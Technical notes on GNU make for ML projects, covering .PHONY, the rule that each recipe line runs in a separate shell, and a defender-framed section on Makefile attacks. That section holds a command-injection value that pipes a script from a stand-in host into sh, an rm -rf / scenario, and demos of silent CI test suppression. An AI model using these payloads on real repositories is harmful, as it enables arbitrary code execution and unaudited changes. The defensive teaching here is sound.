# `make` — orchestration, mechanics, and attack surface

Cross-cutting notes on GNU `make` for orchestrating project tasks. `make` is the lowest-common-denominator task runner — every dev box, every CI image, every container already has it — which is why ML teams reach for it before bringing in heavier tools (`just`, `invoke`, `nox`, Taskfile). One `Makefile` becomes the contract for "how do I build this project."

## Contents

- [Why `make` for ML pipelines](#why-make-for-ml-pipelines)
- [What `.PHONY` actually does](#what-phony-actually-does)
- [Recipe execution model — the things that bite](#recipe-execution-model--the-things-that-bite)
  - [Each recipe line runs in a separate shell](#each-recipe-line-runs-in-a-separate-shell)
  - [`source venv/bin/activate` is almost always a mistake](#source-venvbinactivate-is-almost-always-a-mistake)
  - [`:=` vs `=`](#-vs-)
  - [`@` suppresses echo](#-suppresses-echo)
  - [Editor configuration — the tab trap](#editor-configuration--the-tab-trap)
- [Offensive security angle (defender's perspective)](#offensive-security-angle-defenders-perspective)
  - [Attack 1 — silent test suppression in CI](#attack-1--silent-test-suppression-in-ci)
  - [Attack 2 — recipe injection via unsafe variable expansion](#attack-2--recipe-injection-via-unsafe-variable-expansion)
  - [Attack 3 — running `make` on an untrusted source tree](#attack-3--running-make-on-an-untrusted-source-tree)
  - [Why ML repos are juicier than average](#why-ml-repos-are-juicier-than-average)
- [See also](#see-also)

## Why `make` for ML pipelines

Three things `make` gives you that ad-hoc shell scripts don't:

- **Named, composable targets.** `make all` depends on `setup data train test`. Change one step, the whole pipeline still has one entry point.
- **A documented surface.** `make help` (when you add one) or just reading the `.PHONY` line tells a new joiner every operation the project supports in 30 seconds.
- **Dependency declarations.** If a target's output is a file and its inputs are files, `make` skips work when nothing changed. Most ML orchestration targets are *phony* (they don't produce a file with their own name), so we lose this benefit — but it's why the file-based `make` model exists in the first place, and it's the reason `.PHONY` exists.

The tab-vs-space rule is the single most famous papercut in `make`. It's a 1976 design choice no one can fix without breaking every Makefile on Earth.

This same pattern — name targets, declare dependencies, run them in order — recurs throughout MLOps. A DVC `dvc.yaml` is a more sophisticated version. So is an Argo `Workflow`. `make` is the gateway drug.

## What `.PHONY` actually does

`.PHONY` tells `make`: "this target name is **not** a file — don't check the filesystem before running it."

`make` was built for compiling C. A target `hello.o` is expected to produce a file called `hello.o`. So before running the recipe, `make` checks the filesystem:

1. Is there a file (or directory) named `hello.o`?
2. Is it newer than its prerequisites?
3. If yes → "already up to date", skip the recipe.

That logic is great for compilation. It's wrong for orchestration targets like `clean`, `test`, `setup`. Consider:

```makefile
test:
	pytest tests/
```

If the project has a `tests/` directory (which it usually does), `make` looks at the target name `test`, finds the path exists, sees no prerequisites that are newer, and silently does nothing:

```
$ make test
make: 'test' is up to date.
```

You read that, assume it worked, and ship. `.PHONY` opts the target out of the check:

```makefile
.PHONY: test
test:
	pytest tests/
```

Convention is to declare every phony target in one line at the top of the file:

```makefile
.PHONY: setup data train test clean all
```

**Rule of thumb:** if a target doesn't produce a file with the same name as itself, it's phony. Mark it.

## Recipe execution model — the things that bite

### Each recipe line runs in a separate shell

```makefile
build:
	cd src
	./compile.sh
```

This **does not work as written.** The first line spawns a shell, runs `cd src`, the shell exits — the next line spawns a fresh shell back in the project root and tries to `./compile.sh` which isn't there.

Two fixes:

```makefile
# Option 1: chain with &&
build:
	cd src && ./compile.sh

# Option 2: .ONESHELL: applies to the whole Makefile
.ONESHELL:
build:
	cd src
	./compile.sh
```

`.ONESHELL:` reads more naturally but has a quirk — failures stop only at the *end* of the recipe by default, so you need `set -e` or a similar shell flag. For most projects, `&&` is the boring-and-works answer.

### `source venv/bin/activate` is almost always a mistake

For the same reason. `source` modifies the *current* shell; `make` discards that shell after each line. So:

```makefile
test:
	source venv/bin/activate
	pytest tests/
```

…doesn't put the venv on `PATH` for the `pytest` line. The pytest invocation finds whatever `pytest` is on the system `PATH`, or none.

The boring fix is to call venv binaries directly:

```makefile
VENV := mlops-venv
PYTHON := $(VENV)/bin/python
PYTEST := $(VENV)/bin/pytest

test:
	$(PYTEST) tests/
```

Or chain with `&&` in a single recipe line. Don't reach for `source` — even when it appears to work (it's late at night, the line is one of the rare ones that survives), it's a sign the Makefile is fighting the tool.

### `:=` vs `=`

```makefile
NOW := $(shell date +%s)    # := expands once at parse time
LATER  = $(shell date +%s)  #  = expands every time the variable is used
```

`NOW` captures one timestamp at the start of `make`'s run; `LATER` re-runs `date` each time the variable appears in a recipe. Predictable behaviour comes from `:=`; lazy evaluation from `=`. Prefer `:=` unless you specifically want the lazy form (rare).

This bites most often with `$(shell ...)` calls — recursive `=` will re-shell every time, which is surprising and slow.

### `@` suppresses echo

`make` echoes every recipe line before running it. `@` at the start of a line suppresses that:

```makefile
deploy:
	@echo "Starting deploy to $(ENV)"
	kubectl apply -f manifests/
```

Outputs:

```
Starting deploy to staging
kubectl apply -f manifests/
<kubectl output>
```

Useful for log lines; don't hide real commands behind `@` because then debugging a recipe means temporarily editing the Makefile.

### Editor configuration — the tab trap

Most editors helpfully convert tabs to spaces. For a `Makefile`, that breaks the file (`*** missing separator. Stop.`).

- **VS Code:** `"[makefile]": { "editor.insertSpaces": false }`
- **Vim:** `autocmd FileType make setlocal noexpandtab`
- **EditorConfig:** add `[Makefile]\nindent_style = tab` to `.editorconfig`

Verify with `cat -A Makefile` (Linux) or `cat -et Makefile` (macOS) — tabs show as `^I`, spaces as literal spaces.

## Offensive security angle (defender's perspective)

The phony/non-phony asymmetry isn't just a footgun — it has a sharp edge in CI and supply-chain scenarios. Worth knowing both for defending repos and for understanding what auditors will flag.

### Attack 1 — silent test suppression in CI

If a CI workflow runs `make test` and the `test` target is **not** in `.PHONY`, an attacker who can land a file or directory named `test` in the repo gets:

```
$ make test
make: 'test' is up to date.
$ echo $?
0
```

Tests appear to pass without running. CI is green. Reviewers see ✅ and merge.

Plausible delivery vectors:

- **External-contributor PR** adds a top-level file named `test` (disguised as config). Reviewer doesn't notice. CI's `make test` no-ops. Malicious code in the same PR ships unaudited.
- **Malicious dependency**'s `setup.py` / postinstall writes a file named `test` (or `clean`, `build`, `lint`) into the working directory during `pip install`. The next CI step that invokes `make <that-target>` silently no-ops.
- **Implicit / pattern rules.** `make` has built-in rules — `%.so: %.c` will compile any `.c` file the attacker can plant.

**Defence:** mark every orchestration target `.PHONY`. When auditing a repo, treat any non-phony target whose name is a common English word (`test`, `build`, `clean`, `lint`, `docs`) as a finding.

**To try it yourself** (in a scratch dir):

```bash
mkdir /tmp/phony-demo && cd /tmp/phony-demo
cat > Makefile <<'EOF'
test:
	echo "RUNNING REAL TESTS"
EOF

make test            # prints "RUNNING REAL TESTS"
touch test           # attacker lands a file named "test"
make test            # prints: make: 'test' is up to date.   -- silent skip

# Fix:
printf '.PHONY: test\n%s' "$(cat Makefile)" > Makefile
make test            # prints "RUNNING REAL TESTS" again
```

### Attack 2 — recipe injection via unsafe variable expansion

Not strictly a `.PHONY` issue, but same "Makefile as attack surface" family. A recipe like:

```makefile
clean:
	rm -rf $(DIR)
```

becomes an attacker primitive if `DIR` is influenced from outside the Makefile — environment variable, an `include $(WHATEVER)`, or output from a tool. `DIR=/` is the obvious one. `DIR='. && curl evil.sh | sh'` works too, because `make` passes recipes through a shell.

There have been real CVEs in this shape (Buildroot, OpenWrt, various autotools projects).

**Defence:** never interpolate environment variables into `rm` / `cp` paths without quoting and validation. `rm -rf models/*` is safe (literal glob). The moment someone refactors to `rm -rf $(MODEL_DIR)/*` and `MODEL_DIR` is settable from the environment, it becomes one careless CI variable away from `rm -rf /*`.

**To try it yourself:**

```bash
mkdir /tmp/inj-demo && cd /tmp/inj-demo
mkdir target safe
cat > Makefile <<'EOF'
clean:
	rm -rf $(DIR)
EOF

# Innocent call:
DIR=target make clean       # removes ./target

# Hostile call — value contains shell metachars
DIR='safe && echo PWNED' make clean
# Output: PWNED   <-- arbitrary command executed because the value
#                     was expanded into the recipe verbatim, then
#                     handed to /bin/sh
```

### Attack 3 — running `make` on an untrusted source tree

`make` is fundamentally a build tool you point at *trusted* source. Running `make` on a fresh clone is the same threat model as `curl | bash` — no sandbox, the Makefile is a script.

Specific tricks:

- **`-include` of a generated file** the attacker controls. Pattern: `-include .depends`, where `.depends` is produced by an earlier target. If the attacker writes to `.depends` first, they inject targets and recipes.
- **The `Makefile` itself.** Cloning a stranger's repo and running `make` runs whatever they wrote, as your user.

**Defence:** `cat Makefile` before `make` on any untrusted clone. The same applies to `justfile`, `Taskfile.yml`, `package.json` scripts, `pyproject.toml` `[tool.uv]` build hooks, etc.

### Why ML repos are juicier than average

- Output (model weights) is binary and hard to audit.
- Data pipelines pull from external sources — "trusted input" is already weak.
- Build/test infra is glued together with `make`, `dvc`, and shell — many places for a no-op to hide.
- A silently-skipped `make validate-data` step is undetectable from CI logs unless the recipe normally prints something.

The realistic attack: external PR → adds a path that shadows a CI target name → CI silently no-ops the safety check → poisoned data or weights ship.

Search "Makefile command injection CVE" and Buildroot's CVE history for real case studies. The pattern recurs in every build system that treats string interpolation as the primary configuration mechanism.

## See also

- [GNU Make manual](https://www.gnu.org/software/make/manual/make.html) — the [Phony Targets](https://www.gnu.org/software/make/manual/make.html#Phony-Targets) and [Recipe Syntax](https://www.gnu.org/software/make/manual/make.html#Recipes) sections are the relevant 10 minutes.
- [Makefile tutorial by example](https://makefiletutorial.com/) — readable, runnable, covers 90% of what you'll write.
- [Software Carpentry — Make lesson](https://swcarpentry.github.io/make-novice/) — gentle intro tied to a data-processing example.
- [Your Makefiles are wrong (Tundra)](https://tech.davis-hansson.com/p/make/) — opinionated takedown of common mistakes.
- [POSIX `make`](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/make.html) — the portable subset.
- `days/day-05/` — the lab that produced this content; the day's README has the diagnosis table for the specific broken Makefile.
